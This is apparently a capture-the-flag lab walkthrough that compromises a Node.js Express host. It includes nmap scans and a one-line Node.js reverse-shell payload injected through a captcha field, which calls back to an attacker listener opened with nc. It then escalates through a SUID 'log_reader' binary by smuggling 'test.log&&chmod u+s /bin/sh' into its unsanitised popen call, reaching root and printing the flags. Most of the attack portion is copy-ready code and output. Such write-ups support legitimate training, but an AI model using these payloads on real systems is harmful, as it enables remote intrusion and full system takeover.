```
Running all scans on 192.168.217.250

Host is likely running Unknown OS!

---------------------Starting Port Scan-----------------------

PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```

This isn't very descriptive so do a service scan
```
sudo nmap -sV -p22,5000 192.168.217.250
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Node.js (Express middleware)
```

Testing out the given site on port 5000, we find if we add a ' to the captcha that is added when submitting our checkout, we get a syntax error.

Let's see if we can get a reverse shell

Head to RevShells.com

We know it's node.js from our service scan so pick that. 

The first one doesn't give us anything so pick node.js #2.

Copy the revshell it gives you and remove the line returns to put it all on one line

```
(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("sh", []);var client = new net.Socket();client.connect(80, "192.168.45.222", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})()
```

Open NC
```
nc -nlvp 80
```

Go back to burpsuite from where you were searching the pages for SQLi and insert the payload
![[Pasted image 20240303004924.png]]

Send it and get the reverse shell
```
└─$ nc -nlvp 80
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 192.168.217.250:33590.
python3 -c 'import pty; pty.spawn("/bin/bash")'
bash-5.1$ whoami
whoami
observer
```

Search for SUID permissions
```
find / -perm -u=s 2>/dev/null | grep -v '^/proc\|^/run\|&/sys\|^/snap'
```

```
/usr/local/bin/log_reader
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/newgrp
/usr/bin/bash
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/mount
```

/usr/local/bin/log_reader looks a little off. No information available online via google.

Let's see if the source code that was used to compile it is still on the machine

```
find / -name log_reader.c 2>/dev/null
```

It is at /usr/share/src/log_reader.c

```
bash-5.1$ cat /usr/share/src/log_reader.c
cat /usr/share/src/log_reader.c
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {

    if (argc != 2) {
        printf("Usage: %s filename.log\n", argv[0]);
        return 0;
    }

    char *filename = argv[1];
    char *result;
    result = checkExtention(filename, result);

    if (result != NULL) {
        readFile(filename);
    }

    return 0;
}

void checkExtention(char *filename, char *result) {
    char *ext = strchr(filename, '.');

    if (ext != NULL) {
        result = strstr(ext, ".log");
    }
}

void readFile(char *filename) {
    setuid(0);
    setgid(0);

    printf("Reading: %s\n", filename);

    char command[200] = "/usr/bin/cat ";
    char output[10000];
    FILE *result;

    strcat(command, filename);
    result = popen(command, "r");
    fgets(output, sizeof(output), result);
    printf("%s\n", output);
}
```

Looking at this code we can see filename is checked to make sure it has .log but otherwise, it's not sanitized.

Create a dummy file to read

```
bash-5.1$ echo 'hello' > test.log
```

`echo 'hello' > test.log`

See if we can add permissions to sh
```
bash-5.1$ /usr/local/bin/log_reader "test.log&&chmod u+s /bin/sh"
```
`
`/usr/local/bin/log_reader "test.log&&chmod u+s /bin/sh"`
`Reading: test.log&&chmod u+s /bin/sh`
`hello`

```
bash-5.1$ sh -p
sh -p
# whoami
whoami
root
```

Grab the flags
```cat /root/proof.txt
041ee57a2fc05dd43db1234a185fe334
cat /home/observer/local.txt
1334f75c46dde43f65635f721229c7ea```
